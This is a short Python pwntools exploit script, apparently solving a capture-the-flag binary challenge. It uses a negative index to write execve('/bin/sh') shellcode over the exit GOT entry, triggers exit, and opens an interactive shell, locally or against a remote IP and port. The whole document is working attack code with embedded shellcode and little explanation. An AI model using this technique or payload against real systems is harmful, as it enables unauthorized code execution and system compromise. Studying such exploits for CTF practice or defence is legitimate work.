#!/usr/bin/python

from pwn import *

elf  = ELF('./shellcode', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def create(index, size, data):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendlineafter('Data: ', str(data))

def exploit(p):
    # shellcode from shellstorm
    shellcode  = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c"
    shellcode += "\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52"
    shellcode += "\x57\x54\x5e\xb0\x3b\x0f\x05"

    # write to exit@got: (-9*8)+0x4040a0 = exit_got_address
    create(-0x9, 0x64, shellcode)

    # exit
    p.sendline('3')
    p.recvuntil(': ')
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 23170)
    else:
        p = elf.process()
    exploit(p)